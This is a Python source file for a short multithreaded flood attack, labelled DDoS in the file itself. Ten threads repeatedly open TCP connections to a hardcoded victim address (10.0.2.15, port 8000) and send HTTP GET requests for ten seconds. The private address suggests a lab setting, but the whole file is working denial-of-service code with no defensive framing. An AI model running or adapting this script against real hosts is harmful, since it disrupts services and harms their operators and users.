###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import socket
import threading

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

# Gets the host IP address
ATTACKER_IP = socket.gethostbyname(socket.gethostname())
VICTIM_IP = '10.0.2.15'
PORT = 8000
NUMBER_OF_THREADS = 10

class MyThread(threading.Thread):
    def __init__(self):
        super(MyThread, self).__init__()
        self._stop_event = threading.Event()

    def run(self):
        while not self._stop_event.is_set(): attack()

    def stop(self): self._stop_event.set()

def attack():
    # AF_INET: Specifies the address family (IPv4)
    # SOCK_STREAM: specifies the socket type (TCP)
    ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ddos_socket.connect((VICTIM_IP, PORT))
    ddos_socket.sendto((f"GET /{VICTIM_IP} HTTP/1.1\r\n").encode('ascii'), (VICTIM_IP, PORT))
    ddos_socket.sendto((f"Host: {ATTACKER_IP}\r\n\r\n").encode('ascii'), (VICTIM_IP, PORT))
    ddos_socket.close()

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

if __name__ == '__main__':
    from time import sleep

    print(f'Starting {NUMBER_OF_THREADS} DDoS threads...')
    threads = []
    for index in range(NUMBER_OF_THREADS):
        thread = MyThread()
        thread.start()
        threads.append(thread)

    print(f'Attack started! Waiting 10 seconds...')
    sleep(10)

    for thread in threads: 
        thread.stop()
        thread.join()

    print(f'Attack finished!')